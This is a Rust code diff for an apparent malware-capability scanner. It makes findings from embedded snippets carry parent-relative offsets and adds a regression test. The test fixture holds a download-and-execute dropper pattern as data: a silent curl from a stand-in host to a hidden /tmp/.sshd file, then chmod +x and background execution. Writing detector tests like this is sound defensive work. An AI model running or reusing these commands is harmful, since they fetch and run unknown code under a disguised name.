@@ -757,7 +757,11 @@ pub fn analyze_embedded_string(
         let mut findings = report.findings;
         findings.push(generate_embedded_language_trait(&file_type, offset));
 
-        // Prefix evidence locations to indicate they came from embedded code
+        // Rewrite evidence to be parent-relative so the parent's
+        // proximity checks (`near_bytes`/`near_lines`) measure real
+        // distance between findings that came from different
+        // extracted snippets — e.g. curl in one Dockerfile RUN block
+        // and chmod in the next.
         for finding in &mut findings {
             for evidence in &mut finding.evidence {
                 evidence.location = Some(format!(
@@ -765,6 +769,9 @@ pub fn analyze_embedded_string(
                     offset,
                     evidence.location.as_deref().unwrap_or("unknown")
                 ));
+                for off in &mut evidence.offsets {
+                    *off = off.saturating_add(offset);
+                }
             }
         }
 
@@ -1418,6 +1425,57 @@ mod tests {
                 .iter()
                 .map(|f| (&f.path, &f.file_type, &f.encoding))
                 .collect::<Vec<_>>(),
+        );
+    }
+
+    /// Regression: plain-embedded findings must carry parent-relative
+    /// offsets and `embedded@<parent-offset>:` location prefixes when
+    /// bubbled up to the parent. Without parent offsets, proximity
+    /// checks at the parent level (`near_lines`/`near_bytes`) bucket
+    /// every extracted snippet at line 1, so `chmod +x` in one
+    /// Dockerfile RUN block and `curl -o` in the next look like
+    /// separate sections instead of nearby lines in the source file.
+    #[test]
+    #[allow(clippy::unwrap_used)]
+    fn test_plain_embedded_offsets_are_parent_relative() {
+        // Two shell snippets at known parent offsets, large enough to
+        // be classified as shell by the detector. The first snippet
+        // contains a stage-path reference; the second contains
+        // `chmod +x`. After analysis, evidence offsets must be
+        // parent-relative (snippet offset + inner offset) so the
+        // parent's proximity calculations measure real distance.
+        let parent_offset_a: u64 = 0x40;
+        let parent_offset_b: u64 = 0xd0;
+        let curl_snippet = "curl -skL https://example.com/payload -o /tmp/.sshd 2>/dev/null";
+        let chmod_snippet =
+            "chmod +x /tmp/.sshd\n/tmp/.sshd &\nls /tmp\necho done\nexit 0\n# pad to threshold";
+
+        let strings = vec![
+            make_string_info_at_offset(curl_snippet, parent_offset_a),
+            make_string_info_at_offset(chmod_snippet, parent_offset_b),
+        ];
+
+        let mapper = Arc::new(CapabilityMapper::default());
+        let (_encoded, plain_findings) =
+            process_all_strings("Dockerfile", &strings, &mapper, 0, None, None);
+
+        let any_parent_relative = plain_findings.iter().flat_map(|f| f.evidence.iter()).any(
+            |ev| match (ev.location.as_deref(), ev.offsets.first().copied()) {
+                (Some(loc), Some(off)) => {
+                    loc.starts_with(&format!("embedded@{:#x}:", parent_offset_a))
+                        && off >= parent_offset_a
+                        || loc.starts_with(&format!("embedded@{:#x}:", parent_offset_b))
+                            && off >= parent_offset_b
+                }
+                _ => false,
+            },
+        );
+        assert!(
+            any_parent_relative,
+            "expected at least one `embedded@<offset>:` finding with a parent-relative offset; \
+             got {} findings without one (regression: extracted-snippet proximity broke for \
+             Dockerfile/GitHub Actions fixtures)",
+            plain_findings.len(),
         );
     }
 
